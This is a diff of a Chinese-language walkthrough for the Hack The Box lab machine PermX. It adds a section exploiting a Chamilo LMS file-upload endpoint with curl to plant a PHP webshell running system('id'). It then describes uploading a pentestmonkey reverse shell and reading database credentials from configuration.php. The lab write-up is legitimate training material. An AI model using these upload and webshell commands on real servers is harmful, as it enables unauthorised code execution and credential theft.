@@ -88,35 +88,45 @@ gobuster dir -u http://lms.permx.htb/ -w /usr/share/wordlists/dirb/common.txt
 
 <figure><img src="../../.gitbook/assets/16.png" alt=""><figcaption></figcaption></figure>
 
-* 这里使用的是一个我在靶机训练中常用的一个反弹shell的php脚本（pentestmonkey），修改脚本中kali端的IP及监听端口后，即可上传：
+### 漏洞利用
 
-<figure><img src="../../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>
+* 这里先简单写一个php一句话木马，检测一下当前目标系统是否存在该漏洞：
+
+```bash
+echo '<?php system("id");?>' > shell.php
+# 上传这个一句话木马脚本：
+curl -F 'bigUploadFile=@shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+# 触发这个脚本后，发现利用成功，这意味着我可以直接上传真正的php反弹shell:
+curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php'
+```
+
+* 这里使用的是一个我在靶机训练中常用的一个反弹shell的php脚本（pentestmonkey），修改脚本中kali端的IP及监听端口后，即可上传：
 
 <figure><img src="../../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
 
+* 监听好自己设置的端口，上传该脚本等待回连：
 
-
-
-
-
-
-
-
-
-
-### 漏洞利用
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/19 (6).png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
+* 成功获得反弹shell，此时开始枚举目标主机中的各个文件内容，查找第一个flag：
 
+<figure><img src="../../.gitbook/assets/20 (5).png" alt=""><figcaption></figcaption></figure>
 
+* 此处找到了刚才在浏览器端无法查看的各个配置文件：
 
+<figure><img src="../../.gitbook/assets/21 (3).png" alt=""><figcaption></figcaption></figure>
+
+* 这其中有几个文件都值得关注：
+
+<figure><img src="../../.gitbook/assets/22 (3).png" alt=""><figcaption></figcaption></figure>
+
+* 最终在\`configuration.php\`文件中发现了目标数据库的登录凭证：
+
+<figure><img src="../../.gitbook/assets/23 (3).png" alt=""><figcaption></figcaption></figure>
+
+* 但是该目标并没有开放3306端口，剩下能利用的是端口22上的ssh
 
 
 
